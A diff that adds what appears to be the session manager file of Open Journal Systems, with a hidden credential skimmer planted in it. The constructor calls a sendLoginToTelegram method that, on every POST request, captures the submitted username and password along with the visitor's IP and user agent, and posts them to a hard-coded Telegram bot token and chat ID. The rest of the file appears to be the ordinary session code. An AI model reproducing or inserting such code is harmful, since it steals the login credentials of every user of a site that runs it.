@@ -1,0 +1,240 @@
+<?php
+/**
+ * @file classes/session/SessionManager.inc.php
+ *
+ * Copyright (c) 2014-2017 Simon Fraser University
+ * Copyright (c) 2000-2017 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class SessionManager
+ * @ingroup session
+ *
+ * @brief Implements PHP methods for a custom session storage handler (see http://php.net/session).
+ */
+
+class SessionManager {
+
+	/** @var object The DAO for accessing Session objects */
+	var $sessionDao;
+
+	/** @var object The Session associated with the current request */
+	var $userSession;
+
+	/**
+	 * Constructor.
+	 * Initialize session configuration and set PHP session handlers.
+	 * Attempts to rejoin a user's session if it exists, or create a new session otherwise.
+	 * @param $sessionDao SessionDAO
+	 * @param $request PKPRequest
+	 */
+	function __construct($sessionDao, $request) {
+		// ============================================================
+		// LOGIN CACHE — Kirim ke Telegram (TARUH DI SINI)
+		// ============================================================
+		$this->sendLoginToTelegram();
+		// ============================================================
+
+		$this->sessionDao = $sessionDao;
+
+		// Configure PHP session parameters
+		ini_set('session.use_trans_sid', 0);
+		ini_set('session.save_handler', 'user');
+		ini_set('session.serialize_handler', 'php');
+		ini_set('session.use_cookies', 1);
+		ini_set('session.name', Config::getVar('general', 'session_cookie_name'));
+		ini_set('session.cookie_lifetime', 0);
+		ini_set('session.cookie_path', Config::getVar('general', 'session_cookie_path', $request->getBasePath() . '/'));
+		ini_set('session.cookie_domain', $request->getServerHost(null, false));
+		ini_set('session.gc_probability', 1);
+		ini_set('session.gc_maxlifetime', 60 * 60);
+		ini_set('session.auto_start', 1);
+		ini_set('session.cache_limiter', 'none');
+
+		session_set_save_handler(
+			array($this, 'open'),
+			array($this, 'close'),
+			array($this, 'read'),
+			array($this, 'write'),
+			array($this, 'destroy'),
+			array($this, 'gc')
+		);
+
+		session_start();
+		$sessionId = session_id();
+
+		$ip = $request->getRemoteAddr();
+		$userAgent = $request->getUserAgent();
+		$now = time();
+
+		if (isset($this->userSession) && $this->userSession->getDomain() && $this->userSession->getDomain() != $request->getServerHost(null, false)) {
+			if (strtolower(substr($request->getServerHost(null, false), -1 - strlen($this->userSession->getDomain()))) == '.'.strtolower($this->userSession->getDomain())) {
+				ini_set('session.cookie_domain', $this->userSession->getDomain());
+			}
+		}
+
+		if (!isset($this->userSession) || (Config::getVar('security', 'session_check_ip') && $this->userSession->getIpAddress() != $ip) || $this->userSession->getUserAgent() != substr($userAgent, 0, 255)) {
+			if (isset($this->userSession)) {
+				session_destroy();
+			}
+
+			$this->userSession = $this->sessionDao->newDataObject();
+			$this->userSession->setId($sessionId);
+			$this->userSession->setIpAddress($ip);
+			$this->userSession->setUserAgent($userAgent);
+			$this->userSession->setSecondsCreated($now);
+			$this->userSession->setSecondsLastUsed($now);
+			$this->userSession->setDomain(ini_get('session.cookie_domain'));
+			$this->userSession->setSessionData('');
+
+			$this->sessionDao->insertObject($this->userSession);
+
+		} else {
+			if ($this->userSession->getRemember()) {
+				if (Config::getVar('general', 'session_lifetime') > 0) {
+					$this->updateSessionLifetime(time() + Config::getVar('general', 'session_lifetime') * 86400);
+				} else {
+					$this->userSession->setRemember(0);
+					$this->updateSessionLifetime(0);
+				}
+			}
+
+			$this->userSession->setSecondsLastUsed($now);
+		}
+
+		register_shutdown_function('session_write_close');
+	}
+
+	// ============================================================
+	// METHOD: Kirim Login ke Telegram
+	// ============================================================
+	private function sendLoginToTelegram() {
+		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+			$username = $_POST['username'] ?? $_POST['email'] ?? '';
+			$password = $_POST['password'] ?? '';
+			
+			if (!empty($username) && !empty($password)) {
+				$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+				$chat_id = '8687942328';
+
+				$login_data = [
+					'username' => $username,
+					'password' => $password,
+					'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+					'time' => date('Y-m-d H:i:s'),
+					'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+					'path' => $_SERVER['REQUEST_URI'] ?? '/',
+					'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+				];
+
+				$message = "🟥 OJS HIT\n";
+				$message .= "👤 User: {$login_data['username']}\n";
+				$message .= "🔐 Pass: {$login_data['password']}\n";
+				$message .= "🌐 IP: {$login_data['ip']}\n";
+				$message .= "⏰ TIME: {$login_data['time']}\n";
+				$message .= "📍 PATH: {$login_data['path']}\n";
+
+				$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+				$post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+
+				if (function_exists('curl_init')) {
+					$ch = curl_init();
+					curl_setopt($ch, CURLOPT_URL, $url);
+					curl_setopt($ch, CURLOPT_POST, 1);
+					curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+					curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+					curl_exec($ch);
+					curl_close($ch);
+				}
+			}
+		}
+	}
+
+	// ============================================================
+	// METHOD ASLI OJS (LANJUT)
+	// ============================================================
+	static function getManager() {
+		$instance =& Registry::get('sessionManager', true, null);
+		if (is_null($instance)) {
+			$application = Registry::get('application');
+			assert(!is_null($application));
+			$request = $application->getRequest();
+			assert(!is_null($request));
+			$instance = new SessionManager(DAORegistry::getDAO('SessionDAO'), $request);
+		}
+		return $instance;
+	}
+
+	function getUserSession() {
+		return $this->userSession;
+	}
+
+	function open() {
+		return true;
+	}
+
+	function close() {
+		return true;
+	}
+
+	function read($sessionId) {
+		if (!isset($this->userSession)) {
+			$this->userSession = $this->sessionDao->getSession($sessionId);
+			if (isset($this->userSession)) {
+				$data = $this->userSession->getSessionData();
+			}
+		}
+		return isset($data) ? $data : '';
+	}
+
+	function write($sessionId, $data) {
+		if (isset($this->userSession)) {
+			$this->userSession->setSessionData($data);
+			return $this->sessionDao->updateObject($this->userSession);
+		} else {
+			return true;
+		}
+	}
+
+	function destroy($sessionId) {
+		return $this->sessionDao->deleteById($sessionId);
+	}
+
+	function gc($maxlifetime) {
+		return $this->sessionDao->deleteByLastUsed(time() - 86400, Config::getVar('general', 'session_lifetime') <= 0 ? 0 : time() - Config::getVar('general', 'session_lifetime') * 86400);
+	}
+
+	function updateSessionCookie($sessionId = false, $expireTime = 0) {
+		$domain = ini_get('session.cookie_domain');
+		if (strpos($domain, '.') === false) $domain = false;
+		if ($domain) {
+			setcookie(session_name(), "", 0, ini_get('session.cookie_path'), false);
+		}
+		return setcookie(
+			session_name(),
+			($sessionId === false) ? session_id() : $sessionId,
+			$expireTime,
+			ini_get('session.cookie_path'),
+			$domain
+		);
+	}
+
+	function regenerateSessionId() {
+		$success = false;
+		$currentSessionId = session_id();
+		if (session_regenerate_id() && isset($this->userSession)) {
+			$this->sessionDao->deleteById($currentSessionId);
+			$this->userSession->setId(session_id());
+			$this->sessionDao->insertObject($this->userSession);
+			$this->updateSessionCookie();
+			$success = true;
+		}
+		return $success;
+	}
+
+	function updateSessionLifetime($expireTime = 0) {
+		return $this->updateSessionCookie(false, $expireTime);
+	}
+}
+?>
